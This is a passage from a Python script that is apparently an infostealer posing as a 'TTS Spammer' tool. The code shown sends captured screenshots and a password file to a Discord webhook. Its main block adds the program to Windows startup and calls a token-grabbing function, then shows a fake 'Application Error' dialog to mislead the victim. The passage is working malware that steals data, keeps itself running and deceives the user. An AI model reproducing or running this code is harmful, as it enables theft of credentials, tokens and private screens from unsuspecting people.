                print(f"Error uploading password file: {str(e)}")
        
        for i, screenshot in enumerate(screenshots):
            try:
                img_data = base64.b64decode(screenshot)
                files = {
                    f'screenshot_{i+1}.png': ('screenshot.png', img_data, 'image/png')
                }
                payload = {
                    "username": "TTS Spammer by cyberseall",
                    "avatar_url": "https://cdn.discordapp.com/attachments/1378721590111502376/1379871290352996482/spammer.png?ex=6841d0c8&is=68407f48&hm=78f457bce7e7183d8108dc3c1ea4433693c28a27bba6b15c7825595871ea843a",
                    "content": f"🖼️ **Screenshot #{i+1} Captured** 📸"
                }
                requests.post(webhook_url, files=files, data=payload, timeout=15)
            except Exception as e:
                print(f"Error sending screenshot: {str(e)}")
                continue
    
    return True

if __name__ == '__main__':
    add_to_startup()
    
    get_token()
    
    try:
        import ctypes
        ctypes.windll.user32.MessageBoxW(0, "This application has encountered an error and needs to close.", "Application Error", 0x10)
    except:
        pass
